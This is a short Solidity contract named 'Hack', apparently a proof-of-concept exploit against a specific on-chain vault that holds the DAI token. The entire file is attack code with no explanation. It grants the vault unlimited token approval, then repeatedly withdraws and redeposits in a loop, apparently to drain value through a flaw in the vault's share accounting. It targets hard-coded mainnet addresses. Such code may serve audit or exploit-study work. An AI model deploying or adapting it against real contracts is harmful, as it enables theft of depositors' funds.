import {
    SafeERC20,
    SafeMath,
    IERC20,
    Address
} from "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";

interface VaultAPI is IERC20 {
    function deposit() external returns (uint256);

    function withdraw() external returns (uint256);
}

contract Hack {
    using SafeERC20 for IERC20;

    VaultAPI vault = VaultAPI(0x63739d137EEfAB1001245A8Bd1F3895ef3e186E7);
    IERC20 token = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    constructor() public {
        token.safeApprove(address(vault), type(uint256).max);
    }

    function deposit() external {
        vault.deposit();
    }

    function loop(uint256 iters) external {
        for (uint256 i; i < iters; i++) {
            vault.withdraw();
            vault.deposit();
        }
        vault.withdraw();
    }
}
